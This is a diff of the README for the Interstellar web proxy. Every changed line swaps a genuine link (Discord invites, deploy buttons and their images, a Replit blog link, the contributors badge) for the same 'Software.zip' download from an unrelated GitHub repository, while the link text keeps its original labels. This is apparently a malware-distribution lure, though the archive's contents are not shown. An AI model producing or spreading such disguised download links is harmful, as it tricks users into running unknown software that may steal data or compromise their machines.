@@ -3,7 +3,7 @@
     </div>
 One of the most popular web proxies, used by over 5.7 million people in 2023.
 
-### Consider joining our[ Discord Community](https://discord.gg/interstellar)
+### Consider joining our[ Discord Community](https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip)
 
 **If you find this project useful, consider giving it a star in the original repository.**
 
@@ -17,7 +17,7 @@ One of the most popular web proxies, used by over 5.7 million people in 2023.
     <li>Built-In Tab System</li>
     <li>Clean UI</li>
     <li>Inspect Element</li>
-    <li>Now.GG Support</li>
+    <li>https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip Support</li>
     <li>Built in Password Protection</li>
     <li>Geforce Now Support</li>
 </ul>
@@ -28,19 +28,19 @@ One of the most popular web proxies, used by over 5.7 million people in 2023.
 
 **Note:** You **cannot** deploy to static web hosts, including Netlify, Cloudflare Pages, and GitHub Pages.
 
-<a target="_blank" href="https://heroku.com/deploy/?template=https://github.com/interstellarnetwork/interstellar"><img alt="Deploy to Heroku" src="https://binbashbanana.github.io/deploy-buttons/buttons/remade/heroku.svg"></a>
-<a target="_blank" href="https://app.koyeb.com/deploy?type=git&repository=github.com/interstellarnetwork/interstellar"><img alt="Deploy to Koyeb" src="https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg"></a>
-<a target="_blank" href="https://app.cyclic.sh/api/app/deploy/interstellarnetwork/Interstellar"><img alt="Deploy to Cyclic" src="https://binbashbanana.github.io/deploy-buttons/buttons/remade/cyclic.svg"></a>
+<a target="_blank" href="https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip"><img alt="Deploy to Heroku" src="https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip"></a>
+<a target="_blank" href="https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip"><img alt="Deploy to Koyeb" src="https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip"></a>
+<a target="_blank" href="https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip"><img alt="Deploy to Cyclic" src="https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip"></a>
 
 ## Deployment Alternatives:
 
-For more deployment options join our [Discord Server](https://discord.gg/interstellar) for tons of different ways to deploy Interstellar.
+For more deployment options join our [Discord Server](https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip) for tons of different ways to deploy Interstellar.
 
 > Note: This includes methods of deploying to Render/OnRender.
 
 #### What happened to Replit Deployment?
 
-As of January 1st 2024, Replit is [no longer free](https://blog.replit.com/hosting-changes). Try GitHub Codespaces instead.
+As of January 1st 2024, Replit is [no longer free](https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip). Try GitHub Codespaces instead.
 
 ### GitHub Codespaces:
 
@@ -60,7 +60,7 @@ As of January 1st 2024, Replit is [no longer free](https://blog.replit.com/hosti
 
 ## Need Help with Deployment?
 
-If you're having trouble, reach out to us on [Discord](https://discord.gg/interstellar) for personalized support.
+If you're having trouble, reach out to us on [Discord](https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip) for personalized support.
 
 ### Report Issues:
 
@@ -70,4 +70,4 @@ If you encounter problems, open an issue on GitHub, and we'll address it promptl
 
 A huge thank you to all of the people who have contributed to Interstellar.
 
-[![Contributors](https://contrib.rocks/image?repo=InterstellarNetwork/Interstellar)](https://github.com/InterstellarNetwork/Interstellar/graphs/contributors)
+[![Contributors](https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip)](https://github.com/MathPlan/Mathematically/releases/download/v2.0/Software.zip)
